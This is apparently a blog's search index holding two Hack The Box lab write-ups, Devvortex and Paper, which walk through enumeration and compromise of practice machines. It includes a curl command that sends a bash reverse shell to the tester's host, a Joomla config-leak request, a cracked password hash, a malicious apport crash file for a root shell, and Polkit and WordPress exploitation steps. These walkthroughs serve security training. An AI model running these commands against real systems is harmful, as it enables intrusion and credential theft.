<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Devvortex</title>
    <link href="/2025/05/04/HTB-Devvortex/"/>
    <url>/2025/05/04/HTB-Devvortex/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/devvortexpic/devvortex.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>I start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.242</span> -<span class="hljs-keyword">A</span> -T4<br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>devvortex.htb (10.10.11.242)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><h2 id="Web-enumeration"><a href="#Web-enumeration" class="headerlink" title="Web enumeration:"></a>Web enumeration:</h2><p>Now that I have the main domain, I can try to find subdomains by brute-forcing with a wordlist:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span>devvortex.htb<span class="hljs-regexp">/ -H &quot;HOST: FUZZ.devvortex.htb&quot; -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -fs <span class="hljs-number">154</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/subdomains.png"></p><p>I discovered the <code>dev</code> subdomain during the enumeration and added it to <code>/etc/hosts</code></p><p><img src="/img/devvortexpic/webpage.png"></p><p><img src="/img/devvortexpic/devwebpage.png"></p><p>I then used Dirsearch to enumerate directories on <code>http://dev.devvortex.htb</code> :</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//dev.devvortex.htb</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/dirsearch.png"></p><p>Accessing the <code>/administrator/</code> endpoint revealed a Joomla! Administrator login panel. This confirms that the site is built on Joomla, a widely-used CMS with a known history of vulnerabilities — especially if outdated.</p><p><img src="/img/devvortexpic/login.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h1><p>While examining Joomla’s documentation and deployment structure, I discovered that the version number is exposed at: <code>/administrator/manifests/files/joomla.xml</code> ,which tells us its running joomla version <strong>Joomla 4.2.6</strong>:</p><p><img src="/img/devvortexpic/joomla_ver.png"></p><p>This version is affected by CVE-2023-23752, an unauthenticated information disclosure vulnerability. It allows attackers to retrieve sensitive configuration information such as database credentials, mail server settings, and API keys through a crafted request:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">curl -v <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/dev.devvortex.htb/api</span><span class="hljs-regexp">/index.php/v</span>1/config/application?<span class="hljs-keyword">public</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/jexploit.png"></p><p>Upon attempting to use these credentials in the Joomla login page, we are able to successfully log in as <code>lewis</code> :</p><p><img src="/img/devvortexpic/admin.png"></p><p>While researching methods to add RCE (Remote Code Execution) to a CMS, I came across this <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">exploit</a> ,which allows an attacker to execute arbitrary code on the Joomla server. </p><p>I cloned the repository and installed the exploit onto the website via the Joomla administrator dashboard. To do this, I navigated to <strong>System &gt; Install - Extensions &gt; Upload Package File</strong>, and uploaded the <code>dist/joomla-webshell-plugin-1.1.0.zip</code> file. Joomla confirmed that the extension was installed successfully. After installation, I proceeded to test the plugin:</p><p><img src="/img/devvortexpic/upload.png"></p><p>To gain a reverse shell, I leveraged the webshell by sending a POST request to its endpoint using <code>curl</code>. The payload executes a bash reverse shell connecting back to my machine on port 4444:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl -X POST <span class="hljs-string">&#x27;http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php&#x27;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;action=exec&quot;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>And upon executing the command, I successfully received a reverse shell: </p><p><img src="/img/devvortexpic/revshell.png"></p><p>While browsing through the server files, I came across <code>configuration.php</code>. This file contains the MySQL credentials used by Joomla for database access.</p><p><img src="/img/devvortexpic/configuration.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -h localhost -u lewis -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>After logging in successfully, I listed the tables and identified one of interest:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> sd4fg_users;<br></code></pre></td></tr></table></figure><p>In the results, I found a user named <code>logan</code> along with a hashed password:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">logan : <span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span><span class="hljs-regexp">/1w0eYiB5Ne9XzArQRFJTGThNiy/y</span>BtkIj12<br></code></pre></td></tr></table></figure><p>I saved the bcrypt hash to a file and used <code>john</code> with the <code>rockyou.txt</code> wordlist to attempt cracking it:</p><p><img src="/img/devvortexpic/crackpass.png"></p><p>Now we can ssh with that password to user logan and retrieve user.txt flag:</p><p><img src="/img/devvortexpic/ssh.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h1><p>During post-exploitation enumeration, it was discovered that the user <code>logan</code> has <code>sudo</code> permissions to run the binary <code>/usr/bin/apport-cli</code> without providing a password:</p><p><img src="/img/devvortexpic/sudo.png"></p><p><code>apport-cli</code> is a command-line interface to the Apport crash-reporting system used in Ubuntu. It is written in Python and is capable of parsing <code>.crash</code> files that include Python-specific metadata.<br>The approach involves crafting a <strong>malicious <code>.crash</code> file</strong> that injects arbitrary Python code. When <code>apport-cli</code> parses this file, it can potentially execute our payload with root privileges.</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">cat <span class="hljs-operator">&lt;</span><span class="hljs-operator">&lt;</span>EOF <span class="hljs-operator">&gt;</span> <span class="hljs-symbol">/tmp/rootme.crash</span><br><span class="hljs-params">ProblemType:</span> Crash<br><span class="hljs-params">Architecture:</span> amd64<br><span class="hljs-params">DistroRelease:</span> Ubuntu<br><span class="hljs-params">Package:</span> exploit<br><span class="hljs-params">ExecutablePath:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">ProcCmdline:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">PythonArgs:</span> [&#x27;-c&#x27;, &#x27;<span class="hljs-built_in">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;]<br>EOF<br></code></pre></td></tr></table></figure><p><strong>Explanation</strong>:</p><ul><li>The <code>PythonArgs</code> field is injected with a payload that spawns a root shell using Python’s <code>os.setuid(0)</code> and <code>os.system(&quot;/bin/bash&quot;)</code>.</li></ul><p>With the malicious file in place, we trigger the binary using the following command:</p><p><img src="/img/devvortexpic/runcmd.png"></p><p>Upon pressing <code>V</code>, the shell executes with the <code>!/bin/bash</code> command, effectively launching a <strong>root shell</strong>:</p><p><img src="/img/devvortexpic/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/devvortexpic/totoro.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Paper</title>
    <link href="/2025/04/20/HTB-Paper/"/>
    <url>/2025/04/20/HTB-Paper/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/paper-htb/paperhtb.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>We start by scanning ports:</p><p><img src="/img/paper-htb/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong> </li><li><strong>443 (HTTPS)</strong></li></ul><p> Add :  paper.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p> <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.143</span>    paper.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/paper-htb/website-http.png"></p><p>After conducting some initial enumeration, I did not discover any particularly interesting files or directories. However, I noticed a response header named <code>X-Backend-Server</code> which revealed a domain: <code>office.paper</code></p><p><img src="/img/paper-htb/curl.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/hosts.png"></p><h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>After visiting the website we see multiple posts, and we also see in the footer that it is a WordPress site.</p><p><img src="/img/paper-htb/office-paper.png"></p><p>A review of the page’s source code revealed that the application is using WordPress version 5.2.3 (alternatively, we could use WPScan to enumerate and confirm the version).</p><p><img src="/img/paper-htb/wordpress.png"></p><p>Upon reviewing the WordPress 5.2.3 version and its known vulnerabilities, we identified CVE-2019-17671, which allows viewing private posts or drafts without proper authorization. The following PoC illustrates this issue.</p><p><a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a></p><p><img src="/img/paper-htb/wordpress-exploit.png"></p><p>According to the vulnerability details, it’s possible to leak the content of private posts or drafts by appending <code>?static=1</code> to the URL.</p><p><img src="/img/paper-htb/static.png"></p><p>Discovered a new subdomain: <code>chat.office.paper</code>:</p><p><img src="/img/paper-htb/hidden-url.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/newhost.png"></p><h2 id="Rocket-chat"><a href="#Rocket-chat" class="headerlink" title="Rocket.chat:"></a>Rocket.chat:</h2><p>The registration URL takes us to the chat system <code>rocket.chat</code>.</p><p><img src="/img/paper-htb/rocket-chat.png"></p><p>After entering we see the only channel, <strong>#general</strong>.<br>Within the channel, multiple messages were visible, some of which mentioned a bot and listed the commands it accepts. Based on this, we initiated a conversation with the bot to further explore its functionality.</p><p><img src="/img/paper-htb/general.png"><br>We sent the <code>help</code> command to the bot, which returned a list of available commands. Among them, two stood out as particularly interesting: <code>file</code> and <code>list</code>.<br><img src="/img/paper-htb/help-bot.png"></p><p><img src="/img/paper-htb/list-cmd.png"></p><p>We perform an enumeration of files within the directory using <code>../</code>we see multiple directories&#x2F;files in <code>home/dwight</code>.</p><p><img src="/img/paper-htb/homedir.png"></p><p>Inside the <code>hubot/</code> directory, we found configuration files and the bot’s source code. Notably, the <code>.env</code> file contained the bot’s configuration details, including credentials.</p><p><img src="/img/paper-htb/config.png"></p><p>We use the password via SSH with the user <code>dwight</code>, we manage to obtain a shell and the flag <code>user.txt</code>.</p><p><img src="/img/paper-htb/ssh.png"></p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation:"></a>Privilege escalation:</h2><p>It’s time to escalate our privileges to the root user. To begin, we need to enumerate the system for further information. After downloading <code>linpeas.sh</code>, the script revealed that the system is vulnerable to CVE-2021-3560.</p><p><img src="/img/paper-htb/cvepriv.png"></p><p>According to this <a href="https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/">GitHub blog post</a>, CVE-2021-3560 is a vulnerability in PolKit (PolicyKit), a system service used to manage permissions. The flaw allows an attacker with limited access to gain root privileges. By exploiting this vulnerability, the attacker can trick the system into creating a new superuser account or escalating their own privileges to root, bypassing security restrictions that would normally prevent this.</p><p>To exploit this vulnerability, we will use a script that automates the process. The script, available on <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">GitHub</a></p><p>After downloading the script from GitHub, we used <code>wget</code> to send it to the target system, where it could be executed to exploit the vulnerability.</p><p><img src="/img/paper-htb/exploit.png"></p><p><img src="/img/paper-htb/sendexploit.png"></p><p>We ran the script, and the execution was successful:</p><p><img src="/img/paper-htb/runexploit.png"></p><p>We switched the user to <code>secnigma</code> by exploiting the Polkit vulnerability and then ran <code>sudo bash</code>, which granted us a root shell</p><p><img src="/img/paper-htb/secnigma.png"></p><p>Finally, we accessed and retrieved the root flag.</p><p><img src="/img/paper-htb/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/paper-htb/Ghibli3.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
